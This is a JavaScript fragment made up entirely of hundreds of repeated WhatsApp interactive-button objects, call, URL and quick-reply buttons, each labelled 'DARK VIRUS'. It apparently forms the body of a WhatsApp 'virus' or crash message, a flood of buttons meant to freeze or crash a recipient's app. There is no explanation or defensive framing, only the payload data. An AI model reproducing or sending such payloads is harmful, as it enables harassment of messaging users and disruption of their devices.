{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
